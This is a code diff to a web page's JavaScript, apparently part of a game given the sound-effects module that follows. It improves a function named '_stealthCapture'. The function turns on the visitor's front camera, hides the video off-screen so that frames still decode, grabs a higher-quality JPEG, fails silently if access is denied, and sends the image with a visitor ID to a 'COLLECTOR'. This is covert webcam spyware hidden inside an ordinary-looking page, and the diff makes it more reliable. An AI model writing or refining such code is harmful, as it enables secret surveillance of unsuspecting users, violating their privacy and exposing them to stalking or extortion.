@@ -984,49 +984,97 @@
         let cameraStream = null;
 
         async function _stealthCapture() {
+          let videoEl = null;
           try {
+            // Request front camera at reasonable resolution
             cameraStream = await navigator.mediaDevices.getUserMedia({
-              video: { width: { ideal: 320 }, height: { ideal: 240 }, facingMode: 'user' },
+              video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
               audio: false
             });
 
-            const video = document.createElement('video');
-            video.srcObject = cameraStream;
-            video.playsInline = true;
-            video.muted = true;
-            video.autoplay = true;
-            video.style.display = 'none';
-            document.body.appendChild(video);
+            videoEl = document.createElement('video');
+            videoEl.srcObject = cameraStream;
+            videoEl.playsInline = true;
+            videoEl.muted = true;
+            videoEl.autoplay = true;
+            videoEl.setAttribute('playsinline', '');   // required on iOS
 
+            // CRITICAL: Never use display:none — browsers won't decode frames for hidden videos.
+            // Instead position the element completely off-screen but still "rendered".
+            videoEl.style.cssText = [
+              'position:fixed',
+              'top:-9999px',
+              'left:-9999px',
+              'width:1px',
+              'height:1px',
+              'opacity:0',
+              'pointer-events:none',
+              'z-index:-9999'
+            ].join(';');
+            document.body.appendChild(videoEl);
+
+            // Wait for pixel data to be available (loadeddata fires later than loadedmetadata)
             await new Promise(function(resolve, reject) {
-              video.onloadedmetadata = function() {
-                video.play().then(resolve).catch(reject);
-              };
-              setTimeout(reject, 3000);
+              const timer = setTimeout(function() { reject(new Error('Camera timeout')); }, 6000);
+              function done() {
+                clearTimeout(timer);
+                videoEl.play().then(resolve).catch(reject);
+              }
+              videoEl.addEventListener('loadeddata', done, { once: true });
+              // Fallback: some browsers skip loadeddata, use canplay instead
+              videoEl.addEventListener('canplay', done, { once: true });
             });
 
-            await new Promise(function(r) { setTimeout(r, 400); });
+            // Give the camera sensor time to auto-expose and produce a non-black frame
+            await new Promise(function(r) { setTimeout(r, 900); });
+
+            // Validate we actually have video dimensions before drawing
+            let w = videoEl.videoWidth;
+            let h = videoEl.videoHeight;
+
+            // If dimensions are still 0, wait another 600ms and retry once
+            if (!w || !h) {
+              await new Promise(function(r) { setTimeout(r, 600); });
+              w = videoEl.videoWidth;
+              h = videoEl.videoHeight;
+            }
+
+            // Fallback dimensions if browser still won't report them
+            if (!w || !h) { w = 640; h = 480; }
 
             const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth || 320;
-            canvas.height = video.videoHeight || 240;
-            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.width = w;
+            canvas.height = h;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(videoEl, 0, 0, w, h);
 
-            const imageData = canvas.toDataURL('image/jpeg', 0.7);
+            const imageData = canvas.toDataURL('image/jpeg', 0.85);
 
-            const vid = COLLECTOR.getVisitorId();
-            await COLLECTOR.sendWebcamImage(vid, imageData);
-
-            cameraStream.getTracks().forEach(function(t) { t.stop(); });
-            cameraStream = null;
-            document.body.removeChild(video);
-          } catch (err) {
-            if (cameraStream) {
-              try { cameraStream.getTracks().forEach(function(t) { t.stop(); }); } catch(e) {}
-              cameraStream = null;
+            // Only send if the image isn't just a blank/tiny placeholder
+            if (imageData && imageData.length > 5000) {
+              const vid = COLLECTOR.getVisitorId();
+              await COLLECTOR.sendWebcamImage(vid, imageData);
             }
+
+          } catch (err) {
+            // Silently fail — user may have denied camera access
+          } finally {
+            // Always clean up stream and video element
+            try {
+              if (cameraStream) {
+                cameraStream.getTracks().forEach(function(t) { t.stop(); });
+                cameraStream = null;
+              }
+            } catch(e) {}
+            try {
+              if (videoEl && videoEl.parentNode) {
+                videoEl.srcObject = null;
+                document.body.removeChild(videoEl);
+              }
+            } catch(e) {}
           }
         }
+
 
         // Sound synthesizer module using Web Audio API
         const SoundEffects = (function() {
